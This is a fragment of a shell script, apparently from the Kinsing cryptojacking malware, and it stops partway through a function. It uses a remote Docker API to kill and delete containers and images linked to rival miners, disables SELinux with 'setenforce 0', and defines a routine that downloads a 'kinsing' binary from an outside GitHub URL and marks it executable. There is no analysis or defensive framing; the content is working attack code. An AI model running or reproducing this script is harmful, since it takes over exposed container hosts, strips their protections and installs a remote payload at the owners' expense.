...
docker -H 10.20.0.1:2376  ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 ps | grep "azulu" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 ps | grep "auto" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 ps | grep "xmr" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 ps | grep "mine" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 ps | grep "monero" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker -H 10.20.0.1:2376 kill %
docker -H 10.20.0.1:2376 images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
docker -H 10.20.0.1:2376 images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
docker -H 10.20.0.1:2376 images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
docker -H 10.20.0.1:2376 images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
docker -H 10.20.0.1:2376 images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
docker -H 10.20.0.1:2376 images -a | grep "registry" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
docker -H 10.20.0.1:2376 images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
docker -H 10.20.0.1:2376 images -a | grep "auto" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
docker -H 10.20.0.1:2376 images -a | grep "mine" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
docker -H 10.20.0.1:2376 images -a | grep "monero" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
docker -H 10.20.0.1:2376 images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker -H 10.20.0.1:2376 rmi -f %
setenforce 0
...
download2() {
  $WGET $DIR/kinsing https://github.com/vsk-coding/kinsing-poc/raw/main/kinsing.bin
  chmod +x $DIR/kinsing
  if [ -x "$(command -v md5sum)" ]; then
    sum=$(md5sum $DIR/kinsing | awk '{ print $1 }')
    echo $sum
